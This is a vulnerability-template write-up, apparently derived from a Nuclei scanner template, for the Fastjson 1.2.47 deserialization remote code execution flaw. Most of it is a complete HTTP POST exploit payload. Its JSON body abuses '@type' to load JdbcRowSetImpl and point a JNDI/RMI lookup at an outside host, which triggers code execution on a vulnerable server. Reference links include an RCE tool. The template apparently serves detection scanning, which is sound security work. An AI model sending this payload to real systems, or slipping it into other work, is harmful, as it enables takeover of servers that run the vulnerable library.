# Nuclei Template: Fastjson 1.2.47 - Remote Code Execution
**Template ID:** fastjson-1-2-47-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`fastjson-1-2-47-rce.yaml`)

## Vulnerability Information & PoC

## Description
Fastjson 1.2.47 is susceptible to a deserialization remote code execution vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
        "autoCommit":true
    }
}
```

## References
- https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce
- https://www.freebuf.com/vuls/208339.html
- https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
- https://github.com/wyzxxz/fastjson_rce_tool
